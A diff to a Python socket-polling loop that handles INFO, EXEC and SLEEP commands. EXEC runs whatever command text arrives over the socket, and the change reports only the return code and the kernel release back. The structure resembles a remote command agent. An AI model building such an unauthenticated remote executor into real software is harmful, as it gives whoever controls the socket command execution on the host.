@@ -142,18 +142,29 @@ def poll():
             data = message[17:]
 
             if command == CMD.INFO:
+                uname = os.uname()
                 answer = get(
                     socketHandle,
-                    makePayload(reqId, CMD.INFO, str(os.uname()).encode("utf8")),
+                    makePayload(
+                        reqId,
+                        CMD.INFO,
+                        f"release={uname.release}".encode("utf8"),
+                    ),
                 )
 
             elif command == CMD.EXEC:
-                output = subprocess.run(
+                process = subprocess.run(
                     data.decode("utf8").split(" "),
                     stdout=subprocess.PIPE,
                     stderr=subprocess.PIPE,
-                ).stdout
-                answer = get(socketHandle, makePayload(reqId, CMD.EXEC, output))
+                )
+                # answer = get(socketHandle, makePayload(reqId, CMD.EXEC, process.stdout))
+                answer = get(
+                    socketHandle,
+                    makePayload(
+                        reqId, CMD.EXEC, str(process.returncode).encode("ascii")
+                    ),
+                )
 
             elif command == CMD.SLEEP:
                 return
